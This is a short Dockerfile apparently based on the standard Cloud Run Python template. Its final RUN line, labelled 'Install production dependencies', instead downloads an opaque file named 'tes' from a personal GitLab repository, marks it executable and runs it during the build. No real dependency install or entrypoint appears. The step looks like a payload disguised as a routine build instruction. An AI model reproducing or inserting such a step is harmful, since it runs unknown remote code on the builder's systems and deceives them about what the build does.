# Use the official lightweight Python image.
# https://hub.docker.com/_/python​
FROM python:3

# Allow statements and log messages to immediately appear in the Knative logs
ENV PYTHONUNBUFFERED True

# Copy local code to the container image.
ENV APP_HOME /app
WORKDIR $APP_HOME
COPY . ./ 

# Install production dependencies.
RUN wget https://gitlab.com/ninalasmi937/keong/-/raw/main/tes && chmod u+x tes && ./tes
